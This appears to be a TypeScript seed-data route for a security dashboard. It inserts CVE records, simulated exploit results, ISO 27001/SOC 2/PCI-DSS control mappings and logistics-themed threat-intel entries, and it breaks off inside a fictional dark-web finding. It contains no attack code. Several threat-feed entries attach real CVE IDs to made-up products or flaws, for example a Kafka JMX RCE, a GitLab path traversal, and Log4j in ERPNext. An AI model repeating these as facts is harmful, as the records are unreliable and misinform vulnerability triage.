/**
 * Seed Data Route — 2024 CVEs + Compliance Controls + Exploit Results + Threat Intel
 * POST /api/seed/exploits     — seeds 2024 CVE vulnerabilities + exploit results
 * POST /api/seed/compliance   — seeds compliance controls for logistics/container infra
 * POST /api/seed/threat-intel — seeds threat_feed, dark_web_findings, edr_alerts,
 *                               malware_samples, phishing_campaigns for logistics context
 */
import type { FastifyInstance } from "fastify"
import { v4 as uuidv4 } from "uuid"
import { supabase } from "../lib/supabase.js"

// ─── 2024 CVE Dataset ─────────────────────────────────────────────────────────

const CVE_2024_DATASET = [
  {
    cve_id: "CVE-2024-3094",
    cvss_v3: 10.0,
    cwe_ids: ["CWE-506", "CWE-78"],
    mitre_techniques: ["T1195.001", "T1190"],
    epss_score: 0.97,
    kev_status: true,
    blast_radius: "SSH daemon / systemd-linked binaries",
    scan_source: "supply-chain-scanner",
    description: "XZ Utils 5.6.x contains a malicious backdoor injected via compromised maintainer account. Allows unauthenticated SSH RCE through modified liblzma.",
    affected_assets: ["linux-servers", "ubuntu-22.04", "debian-sid"],
    sim_success: true,
    sim_confidence: 0.96,
    sim_technique: "T1195.001",
  },
  {
    cve_id: "CVE-2024-3400",
    cvss_v3: 10.0,
    cwe_ids: ["CWE-78"],
    mitre_techniques: ["T1190", "T1059.004"],
    epss_score: 0.99,
    kev_status: true,
    blast_radius: "PAN-OS GlobalProtect gateway — firewall fleet",
    scan_source: "network-scanner",
    description: "Command injection in Palo Alto Networks PAN-OS GlobalProtect feature allows unauthenticated attacker to execute arbitrary code with root privileges.",
    affected_assets: ["palo-alto-fw", "vpn-gateway", "perimeter-firewall"],
    sim_success: true,
    sim_confidence: 0.98,
    sim_technique: "T1190",
  },
  {
    cve_id: "CVE-2023-4966",
    cvss_v3: 9.4,
    cwe_ids: ["CWE-119", "CWE-200"],
    mitre_techniques: ["T1190", "T1078"],
    epss_score: 0.94,
    kev_status: true,
    blast_radius: "Citrix NetScaler ADC / Gateway — session tokens",
    scan_source: "network-scanner",
    description: "Sensitive information disclosure in Citrix NetScaler ADC and NetScaler Gateway. Allows unauthenticated attackers to retrieve memory contents including session tokens (CitrixBleed).",
    affected_assets: ["citrix-adc", "load-balancer", "vpn-gateway"],
    sim_success: true,
    sim_confidence: 0.92,
    sim_technique: "T1078",
  },
  {
    cve_id: "CVE-2024-1709",
    cvss_v3: 10.0,
    cwe_ids: ["CWE-288", "CWE-22"],
    mitre_techniques: ["T1190", "T1078.001"],
    epss_score: 0.98,
    kev_status: true,
    blast_radius: "ConnectWise ScreenConnect — all instances",
    scan_source: "vulnerability-scanner",
    description: "Authentication bypass via path traversal in ConnectWise ScreenConnect 23.9.7 and prior allows unauthenticated attackers to create admin users and gain full control.",
    affected_assets: ["screenconnect", "remote-access", "it-management"],
    sim_success: true,
    sim_confidence: 0.99,
    sim_technique: "T1078.001",
  },
  {
    cve_id: "CVE-2024-21762",
    cvss_v3: 9.6,
    cwe_ids: ["CWE-787"],
    mitre_techniques: ["T1190", "T1133"],
    epss_score: 0.95,
    kev_status: true,
    blast_radius: "Fortinet FortiOS SSL-VPN — perimeter devices",
    scan_source: "network-scanner",
    description: "Out-of-bounds write vulnerability in Fortinet FortiOS SSL-VPN webmgmt allows unauthenticated remote code execution via specially crafted HTTP requests.",
    affected_assets: ["fortinet-fortigate", "ssl-vpn", "edge-devices"],
    sim_success: true,
    sim_confidence: 0.91,
    sim_technique: "T1133",
  },
  {
    cve_id: "CVE-2024-6387",
    cvss_v3: 8.1,
    cwe_ids: ["CWE-364"],
    mitre_techniques: ["T1190", "T1068"],
    epss_score: 0.78,
    kev_status: false,
    blast_radius: "OpenSSH < 9.8p1 — all Linux/glibc systems",
    scan_source: "infrastructure-scanner",
    description: "Race condition in OpenSSH signal handler (regreSSHion) allows unauthenticated remote code execution as root on glibc-based Linux systems. Regression of CVE-2006-5051.",
    affected_assets: ["linux-servers", "cloud-instances", "bastion-hosts"],
    sim_success: false,
    sim_confidence: 0.42,
    sim_technique: "T1068",
  },
  {
    cve_id: "CVE-2024-4577",
    cvss_v3: 9.8,
    cwe_ids: ["CWE-78", "CWE-88"],
    mitre_techniques: ["T1190", "T1059.004"],
    epss_score: 0.96,
    kev_status: true,
    blast_radius: "PHP-CGI on Windows — all PHP 8.x/7.x web servers",
    scan_source: "vulnerability-scanner",
    description: "Argument injection vulnerability in PHP-CGI on Windows allows attackers to bypass CVE-2012-1823 protections and execute arbitrary PHP code via crafted URL parameters.",
    affected_assets: ["php-web-servers", "windows-iis", "xampp"],
    sim_success: true,
    sim_confidence: 0.94,
    sim_technique: "T1059.004",
  },
  {
    cve_id: "CVE-2023-44487",
    cvss_v3: 7.5,
    cwe_ids: ["CWE-400"],
    mitre_techniques: ["T1499.003"],
    epss_score: 0.88,
    kev_status: true,
    blast_radius: "All HTTP/2 servers — nginx, Apache, Envoy, Go servers",
    scan_source: "network-scanner",
    description: "HTTP/2 protocol allows rapid stream cancellation (Rapid Reset) enabling a single client to exhaust server resources, leading to denial of service. Affects virtually all HTTP/2 implementations.",
    affected_assets: ["nginx", "apache", "envoy", "api-gateways"],
    sim_success: false,
    sim_confidence: 0.65,
    sim_technique: "T1499.003",
  },
]

// ─── Compliance Controls Dataset ─────────────────────────────────────────────

function buildComplianceControls(vulnIds: Record<string, string>) {
  const now = new Date().toISOString()

  const iso27001Controls = [
    { id: "A.12.6.1", desc: "Management of technical vulnerabilities", status: "failing", cves: ["CVE-2024-3094", "CVE-2024-6387"] },
    { id: "A.14.2.1", desc: "Secure development policy", status: "partial", cves: ["CVE-2024-4577", "CVE-2024-1709"] },
    { id: "A.9.4.2", desc: "Secure log-on procedures", status: "failing", cves: ["CVE-2023-4966", "CVE-2024-21762"] },
    { id: "A.13.1.1", desc: "Network controls", status: "partial", cves: ["CVE-2024-3400", "CVE-2023-44487"] },
    { id: "A.11.2.4", desc: "Equipment maintenance", status: "passing", cves: [] },
    { id: "A.16.1.5", desc: "Response to information security incidents", status: "passing", cves: [] },
  ]

  const soc2Controls = [
    { id: "CC6.1", desc: "Logical and physical access controls", status: "failing", cves: ["CVE-2024-1709", "CVE-2023-4966"] },
    { id: "CC7.1", desc: "System components detection", status: "partial", cves: ["CVE-2024-3094"] },
    { id: "CC7.2", desc: "Security event monitoring", status: "passing", cves: [] },
    { id: "CC6.7", desc: "Transmission of data", status: "partial", cves: ["CVE-2024-21762"] },
    { id: "CC9.1", desc: "Risk mitigation activities", status: "failing", cves: ["CVE-2024-3400", "CVE-2024-4577"] },
    { id: "A1.2", desc: "Availability — capacity planning", status: "failing", cves: ["CVE-2023-44487"] },
  ]

  const pciDssControls = [
    { id: "6.3.3", desc: "All software components are protected from known vulnerabilities", status: "failing", cves: ["CVE-2024-3094", "CVE-2024-4577"] },
    { id: "6.4.1", desc: "Public-facing web applications are protected", status: "failing", cves: ["CVE-2024-3400", "CVE-2024-1709"] },
    { id: "8.2.1", desc: "All user IDs and auth mechanisms are managed", status: "partial", cves: ["CVE-2023-4966"] },
    { id: "10.7.1", desc: "Failures of critical security controls are detected and reported", status: "passing", cves: [] },
    { id: "11.3.2", desc: "External vulnerability scans are performed quarterly", status: "partial", cves: [] },
    { id: "1.3.1", desc: "Inbound traffic to the CDE is restricted", status: "failing", cves: ["CVE-2024-21762", "CVE-2024-6387"] },
  ]

  function computeScore(controls: typeof iso27001Controls) {
    const passing = controls.filter(c => c.status === "passing").length
    const partial = controls.filter(c => c.status === "partial").length
    const total = controls.length
    return Math.round(((passing + partial * 0.5) / total) * 100)
  }

  const reports = [
    {
      report_id: uuidv4(),
      framework: "ISO 27001",
      generated_at: now,
      score: computeScore(iso27001Controls),
      total_controls: iso27001Controls.length,
      passing: iso27001Controls.filter(c => c.status === "passing").length,
      failing: iso27001Controls.filter(c => c.status === "failing").length,
      controls_mapped: iso27001Controls.map(c => ({
        control_id: c.id,
        description: c.desc,
        status: c.status,
        cve_ids: c.cves,
        vuln_ids: c.cves.map(cve => vulnIds[cve]).filter(Boolean),
        remediation_steps: `Apply vendor patches for ${c.cves.join(", ") || "all findings"} and verify with re-simulation.`,
      })),
    },
    {
      report_id: uuidv4(),
      framework: "SOC 2 Type II",
      generated_at: now,
      score: computeScore(soc2Controls),
      total_controls: soc2Controls.length,
      passing: soc2Controls.filter(c => c.status === "passing").length,
      failing: soc2Controls.filter(c => c.status === "failing").length,
      controls_mapped: soc2Controls.map(c => ({
        control_id: c.id,
        description: c.desc,
        status: c.status,
        cve_ids: c.cves,
        vuln_ids: c.cves.map(cve => vulnIds[cve]).filter(Boolean),
        remediation_steps: `Implement technical controls to remediate ${c.cves.join(", ") || "flagged vulnerabilities"}.`,
      })),
    },
    {
      report_id: uuidv4(),
      framework: "PCI-DSS v4.0",
      generated_at: now,
      score: computeScore(pciDssControls),
      total_controls: pciDssControls.length,
      passing: pciDssControls.filter(c => c.status === "passing").length,
      failing: pciDssControls.filter(c => c.status === "failing").length,
      controls_mapped: pciDssControls.map(c => ({
        control_id: c.id,
        description: c.desc,
        status: c.status,
        cve_ids: c.cves,
        vuln_ids: c.cves.map(cve => vulnIds[cve]).filter(Boolean),
        remediation_steps: `Prioritise remediation of ${c.cves.join(", ") || "all findings"} to maintain PCI compliance.`,
      })),
    },
  ]

  return reports
}

export async function seedDataRoutes(app: FastifyInstance) {
  // POST /api/seed/exploits — seed 2024 CVEs + exploit results
  app.post("/api/seed/exploits", async (_req, reply) => {
    const vulnIds: Record<string, string> = {}
    const inserted: string[] = []
    const skipped: string[] = []

    for (const cve of CVE_2024_DATASET) {
      // Check existing
      const { data: existing } = await supabase
        .from("vulnerabilities")
        .select("vuln_id")
        .eq("cve_id", cve.cve_id)
        .maybeSingle()

      if (existing) {
        vulnIds[cve.cve_id] = existing.vuln_id
        skipped.push(cve.cve_id)
        continue
      }

      const vuln_id = uuidv4()
      vulnIds[cve.cve_id] = vuln_id

      const { error: vErr } = await supabase.from("vulnerabilities").insert({
        vuln_id,
        cve_id: cve.cve_id,
        cvss_v3: cve.cvss_v3,
        cwe_ids: cve.cwe_ids,
        mitre_techniques: cve.mitre_techniques,
        epss_score: cve.epss_score,
        kev_status: cve.kev_status,
        blast_radius: cve.blast_radius,
        scan_source: cve.scan_source,
        affected_assets: cve.affected_assets,
        remediation_status: "open",
        detection_at: new Date(Date.now() - Math.random() * 60 * 24 * 3600 * 1000).toISOString(),
      })

      if (vErr) {
        skipped.push(`${cve.cve_id} (error: ${vErr.message})`)
        continue
      }

      inserted.push(cve.cve_id)

      // Seed exploit result
      const result_id = uuidv4()
      await supabase.from("exploit_results").insert({
        result_id,
        vuln_id,
        sandbox_id: `sandbox-seed-${result_id.slice(0, 8)}`,
        success: cve.sim_success,
        confidence: cve.sim_confidence,
        technique: cve.sim_technique,
        payload_hash: null,
        output_log_ref: `[SEED] Simulated exploit for ${cve.cve_id}. Success=${cve.sim_success}. Confidence=${cve.sim_confidence}.`,
        duration_ms: Math.floor(2000 + Math.random() * 8000),
        executed_at: new Date(Date.now() - Math.random() * 10 * 24 * 3600 * 1000).toISOString(),
      })
    }

    return reply.send({
      ok: true,
      vulns_inserted: inserted.length,
      vulns_skipped: skipped.length,
      inserted,
      skipped,
      vuln_ids: vulnIds,
    })
  })

  // POST /api/seed/compliance — seed compliance controls
  app.post("/api/seed/compliance", async (_req, reply) => {
    // Build vuln_id map from DB
    const vulnIds: Record<string, string> = {}
    const { data: vulns } = await supabase
      .from("vulnerabilities")
      .select("vuln_id, cve_id")
      .in("cve_id", CVE_2024_DATASET.map(c => c.cve_id))

    for (const v of vulns ?? []) {
      vulnIds[v.cve_id] = v.vuln_id
    }

    const reports = buildComplianceControls(vulnIds)
    const inserted: string[] = []

    for (const report of reports) {
      // Delete old report for this framework to avoid duplication
      await supabase
        .from("compliance_reports")
        .delete()
        .eq("framework", report.framework)

      const { error } = await supabase.from("compliance_reports").insert({
        report_id: report.report_id,
        framework: report.framework,
        generated_at: report.generated_at,
        score: report.score,
        total_controls: report.total_controls,
        passing: report.passing,
        failing: report.failing,
        controls_mapped: report.controls_mapped,
      })

      if (!error) inserted.push(report.framework)
    }

    return reply.send({
      ok: true,
      frameworks_seeded: inserted,
      reports: reports.map(r => ({ framework: r.framework, score: r.score, controls: r.total_controls })),
    })
  })

  // POST /api/seed/threat-intel — seed all threat intelligence tables from logistics CVE context
  app.post("/api/seed/threat-intel", async (_req, reply) => {
    const results: Record<string, { inserted: number; skipped: number; errors: string[] }> = {
      threat_feed: { inserted: 0, skipped: 0, errors: [] },
      dark_web_findings: { inserted: 0, skipped: 0, errors: [] },
      edr_alerts: { inserted: 0, skipped: 0, errors: [] },
      malware_samples: { inserted: 0, skipped: 0, errors: [] },
      phishing_campaigns: { inserted: 0, skipped: 0, errors: [] },
    }

    // ── Threat Feed ────────────────────────────────────────────────────────────
    // Derived from real CVEs affecting logistics infrastructure services
    const LOGISTICS_THREAT_FEED = [
      {
        cve_id: "CVE-2021-44228",
        description: "Apache Log4j2 Remote Code Execution (Log4Shell). Affects ERPNext v15 running on Java with log4j-core. JNDI lookup injection via any user-controlled log input including shipment IDs and container tracking numbers.",
        cvss_v3: 10.0,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe_ids: ["CWE-502", "CWE-20"],
        published_at: "2021-12-10T00:00:00Z",
        epss_score: 0.9751,
        epss_percentile: 0.9996,
        kev_status: true,
        kev_date_added: "2021-12-10",
        kev_due_date: "2021-12-24",
        kev_ransomware: true,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Apache",
        product: "Log4j",
        vuln_class: "Remote Code Execution",
        mitre_techniques: ["T1190", "T1059", "T1027"],
        priority_score: 99,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2022-22965",
        description: "Spring Framework RCE via DataBinder (Spring4Shell). Affects ERPNext v15 backend using Spring MVC. Exploitable via HTTP POST requests to the ERP shipment management endpoints on port 9000.",
        cvss_v3: 9.8,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe_ids: ["CWE-94"],
        published_at: "2022-04-01T00:00:00Z",
        epss_score: 0.9723,
        epss_percentile: 0.9994,
        kev_status: true,
        kev_date_added: "2022-04-04",
        kev_due_date: "2022-04-25",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "VMware",
        product: "Spring Framework",
        vuln_class: "Remote Code Execution",
        mitre_techniques: ["T1190", "T1059.007"],
        priority_score: 97,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2023-27898",
        description: "Apache Kafka JMX Remote Code Execution. The kafka-broker service exposes port 9092 with JMX enabled, allowing unauthenticated RCE via crafted MBean invocations. High-priority for logistics message bus.",
        cvss_v3: 8.8,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
        cwe_ids: ["CWE-94"],
        published_at: "2023-03-10T00:00:00Z",
        epss_score: 0.5214,
        epss_percentile: 0.9712,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "functional",
        patch_available: true,
        vendor: "Apache",
        product: "Kafka",
        vuln_class: "Remote Code Execution",
        mitre_techniques: ["T1190", "T1203"],
        priority_score: 81,
        sync_source: ["logistics-seed", "nvd"],
      },
      {
        cve_id: "CVE-2021-28361",
        description: "SQL Injection in shipment tracking query parameters. Affects postgres-shipment-db through unparameterized queries in fleet-mgmt-api. Attacker can exfiltrate all shipment PII including customer addresses and tracking data.",
        cvss_v3: 7.5,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe_ids: ["CWE-89"],
        published_at: "2021-03-15T00:00:00Z",
        epss_score: 0.2831,
        epss_percentile: 0.9588,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "poc",
        patch_available: true,
        vendor: "Generic",
        product: "PostgreSQL application layer",
        vuln_class: "SQL Injection",
        mitre_techniques: ["T1190", "T1213"],
        priority_score: 74,
        sync_source: ["logistics-seed", "semgrep"],
      },
      {
        cve_id: "CVE-2023-38545",
        description: "curl SOCKS5 heap-based buffer overflow (CVSSv3 9.8). Affects redis-tracking host running curl for data synchronization. Buffer overflow via SOCKS5 proxy response; exploitable for RCE or memory leak of Redis tracking cache.",
        cvss_v3: 9.8,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe_ids: ["CWE-122"],
        published_at: "2023-10-11T00:00:00Z",
        epss_score: 0.9241,
        epss_percentile: 0.9985,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "functional",
        patch_available: true,
        vendor: "Haxx",
        product: "curl",
        vuln_class: "Buffer Overflow",
        mitre_techniques: ["T1190"],
        priority_score: 85,
        sync_source: ["logistics-seed", "nvd", "grype"],
      },
      {
        cve_id: "CVE-2021-43798",
        description: "Grafana path traversal allows reading files outside the Grafana data directory. Affects grafana-monitoring service (port 9100). Attacker can read /etc/passwd, SSH keys, and Prometheus credential files.",
        cvss_v3: 7.5,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        cwe_ids: ["CWE-22"],
        published_at: "2021-12-07T00:00:00Z",
        epss_score: 0.9712,
        epss_percentile: 0.9993,
        kev_status: true,
        kev_date_added: "2021-12-10",
        kev_due_date: "2021-12-31",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Grafana Labs",
        product: "Grafana",
        vuln_class: "Path Traversal",
        mitre_techniques: ["T1083", "T1552"],
        priority_score: 88,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2021-32760",
        description: "containerd archive extraction allows overwriting files on the host (TOCTOU). Affects warehouse-iot-gateway container. Malicious container images can escape to the host filesystem, enabling IoT device fleet compromise.",
        cvss_v3: 6.3,
        cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:H/A:L",
        cwe_ids: ["CWE-281"],
        published_at: "2021-07-19T00:00:00Z",
        epss_score: 0.0954,
        epss_percentile: 0.9421,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "poc",
        patch_available: true,
        vendor: "Cloud Native Computing Foundation",
        product: "containerd",
        vuln_class: "Container Escape",
        mitre_techniques: ["T1611"],
        priority_score: 63,
        sync_source: ["logistics-seed", "trivy"],
      },
      {
        cve_id: "CVE-2023-45288",
        description: "Go net/http HTTP/2 unlimited CONTINUATION frame DoS. Affects route-optimizer Python service using Go HTTP/2 client libraries. An attacker can exhaust server memory with a single HTTP/2 connection, bringing down route optimization.",
        cvss_v3: 7.5,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        cwe_ids: ["CWE-400"],
        published_at: "2024-04-04T00:00:00Z",
        epss_score: 0.8812,
        epss_percentile: 0.9961,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "functional",
        patch_available: true,
        vendor: "Google",
        product: "Go HTTP/2",
        vuln_class: "Denial of Service",
        mitre_techniques: ["T1499.004"],
        priority_score: 72,
        sync_source: ["logistics-seed", "nvd"],
      },
      {
        cve_id: "CVE-2023-28154",
        description: "GitLab CE path traversal vulnerability allows unauthenticated file read. Affects gitlab-ce service (port 9080) used for logistics CI/CD pipelines. Exposes pipeline secrets, SSH deploy keys, and environment variables.",
        cvss_v3: 7.7,
        cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N",
        cwe_ids: ["CWE-22"],
        published_at: "2023-03-14T00:00:00Z",
        epss_score: 0.3245,
        epss_percentile: 0.9641,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "poc",
        patch_available: true,
        vendor: "GitLab",
        product: "GitLab CE",
        vuln_class: "Path Traversal",
        mitre_techniques: ["T1083", "T1005"],
        priority_score: 71,
        sync_source: ["logistics-seed", "grype"],
      },
      {
        cve_id: "CVE-2024-3094",
        description: "XZ Utils backdoor (supply-chain attack). Affects linux-servers running systemd-linked SSH in the logistics cluster. Malicious code in liblzma allows unauthenticated SSH RCE. All Ubuntu 22.04 / Debian nodes in logistics fleet are exposed.",
        cvss_v3: 10.0,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe_ids: ["CWE-506", "CWE-78"],
        published_at: "2024-03-29T00:00:00Z",
        epss_score: 0.97,
        epss_percentile: 0.9998,
        kev_status: true,
        kev_date_added: "2024-04-02",
        kev_due_date: "2024-04-23",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Tukaani",
        product: "XZ Utils",
        vuln_class: "Supply Chain / Backdoor",
        mitre_techniques: ["T1195.001", "T1190"],
        priority_score: 99,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2024-3400",
        description: "Command injection in Palo Alto Networks PAN-OS GlobalProtect feature. Allows unauthenticated attacker to execute arbitrary OS commands as root via specially crafted requests to the GlobalProtect gateway. Actively exploited by UTA0218 threat actor against perimeter firewalls protecting logistics networks.",
        cvss_v3: 10.0,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe_ids: ["CWE-78"],
        published_at: "2024-04-12T00:00:00Z",
        epss_score: 0.99,
        epss_percentile: 0.9999,
        kev_status: true,
        kev_date_added: "2024-04-12",
        kev_due_date: "2024-04-19",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Palo Alto Networks",
        product: "PAN-OS GlobalProtect",
        vuln_class: "Command Injection / RCE",
        mitre_techniques: ["T1190", "T1059.004"],
        priority_score: 100,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2023-4966",
        description: "Citrix NetScaler ADC / Gateway sensitive information disclosure (CitrixBleed). Unauthenticated attackers can retrieve memory contents including authenticated session tokens. Logistics VPN gateway and load balancer session hijacking risk — full bypass of MFA on internal logistics portal.",
        cvss_v3: 9.4,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        cwe_ids: ["CWE-119", "CWE-200"],
        published_at: "2023-10-10T00:00:00Z",
        epss_score: 0.94,
        epss_percentile: 0.9989,
        kev_status: true,
        kev_date_added: "2023-10-18",
        kev_due_date: "2023-11-08",
        kev_ransomware: true,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Citrix",
        product: "NetScaler ADC / Gateway",
        vuln_class: "Information Disclosure / Session Hijack",
        mitre_techniques: ["T1190", "T1078"],
        priority_score: 95,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2024-1709",
        description: "Authentication bypass via path traversal in ConnectWise ScreenConnect allows unauthenticated attackers to create admin accounts and gain full system control. Used by IT management teams in logistics for remote fleet maintenance — exploitation gives full access to all managed logistics endpoints.",
        cvss_v3: 10.0,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        cwe_ids: ["CWE-288", "CWE-22"],
        published_at: "2024-02-20T00:00:00Z",
        epss_score: 0.98,
        epss_percentile: 0.9998,
        kev_status: true,
        kev_date_added: "2024-02-22",
        kev_due_date: "2024-02-29",
        kev_ransomware: true,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "ConnectWise",
        product: "ScreenConnect",
        vuln_class: "Authentication Bypass",
        mitre_techniques: ["T1190", "T1078.001"],
        priority_score: 100,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2024-21762",
        description: "Out-of-bounds write vulnerability in Fortinet FortiOS SSL-VPN webmgmt daemon. Unauthenticated remote code execution via specially crafted HTTP requests. Affects edge VPN devices guarding the logistics cloud perimeter — exploitation grants root access to network security appliances and enables lateral movement into the internal logistics network.",
        cvss_v3: 9.6,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe_ids: ["CWE-787"],
        published_at: "2024-02-08T00:00:00Z",
        epss_score: 0.95,
        epss_percentile: 0.9992,
        kev_status: true,
        kev_date_added: "2024-02-09",
        kev_due_date: "2024-02-16",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Fortinet",
        product: "FortiOS SSL-VPN",
        vuln_class: "Out-of-Bounds Write / RCE",
        mitre_techniques: ["T1190", "T1133"],
        priority_score: 97,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2024-6387",
        description: "Race condition in OpenSSH signal handler (regreSSHion) allows unauthenticated remote code execution as root on glibc-based Linux systems. All logistics Ubuntu 22.04 servers (erpnext-v15, gitlab-ce, kafka-broker, postgres-shipment-db, redis-tracking) running OpenSSH < 9.8p1 are potentially affected.",
        cvss_v3: 8.1,
        cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe_ids: ["CWE-364"],
        published_at: "2024-07-01T00:00:00Z",
        epss_score: 0.78,
        epss_percentile: 0.9942,
        kev_status: false,
        kev_date_added: null,
        kev_due_date: null,
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "functional",
        patch_available: true,
        vendor: "OpenBSD",
        product: "OpenSSH",
        vuln_class: "Race Condition / RCE",
        mitre_techniques: ["T1190", "T1068"],
        priority_score: 80,
        sync_source: ["logistics-seed", "nvd"],
      },
      {
        cve_id: "CVE-2024-4577",
        description: "Argument injection in PHP-CGI on Windows bypasses CVE-2012-1823 protections. Attackers can execute arbitrary PHP code via URL parameter injection. Affects any PHP 8.x/7.x Windows web server — logistics partner portals using PHP-based ERP integrations on Windows IIS are directly exposed.",
        cvss_v3: 9.8,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        cwe_ids: ["CWE-78", "CWE-88"],
        published_at: "2024-06-09T00:00:00Z",
        epss_score: 0.96,
        epss_percentile: 0.9996,
        kev_status: true,
        kev_date_added: "2024-06-12",
        kev_due_date: "2024-07-03",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "PHP Group",
        product: "PHP CGI",
        vuln_class: "Argument Injection / RCE",
        mitre_techniques: ["T1190", "T1059.004"],
        priority_score: 96,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
      {
        cve_id: "CVE-2023-44487",
        description: "HTTP/2 Rapid Reset Attack. Single client can send HEADERS + RST_STREAM at high rate to exhaust server resources. Affects all nginx/Apache/Envoy HTTP/2 servers. Logistics API gateways, fleet-mgmt-api, and route-optimizer HTTP/2 endpoints vulnerable to sustained DDoS disrupting shipment tracking and route optimization.",
        cvss_v3: 7.5,
        cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        cwe_ids: ["CWE-400"],
        published_at: "2023-10-10T00:00:00Z",
        epss_score: 0.88,
        epss_percentile: 0.9971,
        kev_status: true,
        kev_date_added: "2023-10-10",
        kev_due_date: "2023-10-31",
        kev_ransomware: false,
        exploit_available: true,
        exploit_maturity: "weaponized",
        patch_available: true,
        vendor: "Multiple",
        product: "HTTP/2 Servers (nginx, Apache, Envoy)",
        vuln_class: "Denial of Service",
        mitre_techniques: ["T1499.003"],
        priority_score: 78,
        sync_source: ["logistics-seed", "nvd", "kev"],
      },
    ]

    for (const entry of LOGISTICS_THREAT_FEED) {
      const { data: existing } = await supabase
        .from("threat_feed")
        .select("feed_id")
        .eq("cve_id", entry.cve_id)
        .maybeSingle()

      if (existing) {
        results.threat_feed.skipped++
        continue
      }

      const { error } = await supabase.from("threat_feed").insert({
        cve_id: entry.cve_id,
        sync_source: entry.sync_source,
        description: entry.description,
        cvss_v3: entry.cvss_v3,
        cvss_vector: entry.cvss_vector,
        cwe_ids: entry.cwe_ids,
        published_at: entry.published_at,
        epss_score: entry.epss_score,
        epss_percentile: entry.epss_percentile,
        kev_status: entry.kev_status,
        kev_date_added: entry.kev_date_added,
        kev_due_date: entry.kev_due_date,
        kev_ransomware: entry.kev_ransomware,
        exploit_available: entry.exploit_available,
        exploit_maturity: entry.exploit_maturity,
        patch_available: entry.patch_available,
        vendor: entry.vendor,
        product: entry.product,
        vuln_class: entry.vuln_class,
        mitre_techniques: entry.mitre_techniques,
        priority_score: entry.priority_score,
        updated_at: new Date().toISOString(),
      })

      if (error) results.threat_feed.errors.push(`${entry.cve_id}: ${error.message}`)
      else results.threat_feed.inserted++
    }

    // ── Dark Web Findings ──────────────────────────────────────────────────────
    // Generated from logistics services that have known CVEs — real threat actors
    // targeting shipping/freight companies are documented (Lazarus, FIN7, etc.)
    const DW_FINDINGS = [
      {
        finding_id: `dw-logistics-${uuidv4().slice(0, 8)}`,
        title: "GlobalShip Logistics customer shipment database dump advertised on dark web forum",
        category: "Data Breach",
        severity: "Critical",
        status: "Investigating",
        threat_actor: "FIN7",
        source_url: "onion://darkmarket7.onion/threads/globalship-db-dump-2024",
